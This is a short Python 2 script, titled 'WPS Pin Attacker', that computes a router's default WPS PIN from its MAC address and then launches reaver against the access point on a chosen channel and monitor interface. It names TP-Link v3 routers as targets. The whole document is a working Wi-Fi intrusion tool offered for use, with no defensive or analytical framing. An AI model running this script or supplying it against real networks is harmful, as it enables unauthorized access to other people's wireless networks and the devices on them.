'''
by Lawrence Amer 
 
'''
 
import sys
import os 
import subprocess
from subprocess import Popen, PIPE
from threading import Timer

 
VERSION    = 0
SUBVERSION = 2
#console colors 
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray

print P+(""" 
          ----------- WPS Pin Attacker ---------------------
          [+] Security Researcher : Lawrence Amer 
          [~] Email : sec@secteach.me
          [+] infected Routers : tplink v3 
          [+] Site: lawrenceamer.me 
           
          -----------------------------------------------------------
          """)
          
     
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Note : Attack finished  "
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
        string1 = raw_input(W+"[~]. Enter Router MAC Address:: ")
        string2 = string1.replace(':','')
        newstring = string2[-6:]
        p = int(newstring , 16) % 10000000
        print R+"[+] WPS pin is : %07d%d" % (p, wps_pin_checksum(p)) 
        pin=  "%07d%d" % (p, wps_pin_checksum(p))
  #      pin="17304320"
        choice = raw_input("[+]. Hey do you want to attack this AP [y/n] :?")
        if choice =="y":
	  channel =raw_input("[~].Enter AP Channel(ex:1-14):")
	  interface=raw_input("[~].Type your monitering interface(ex:mon0):")
          process = subprocess.Popen(['timeout','10',"reaver", "-i", interface, "-c", channel, "-b", string1,"-p",pin], stdout=subprocess.PIPE)
          output,err = process.communicate()
          print R+output
          print W+("[~].Attack has been finished ..")
          
          
                   
        else:
	  print("oh Good bye!")
    
except Exception:
    usage()
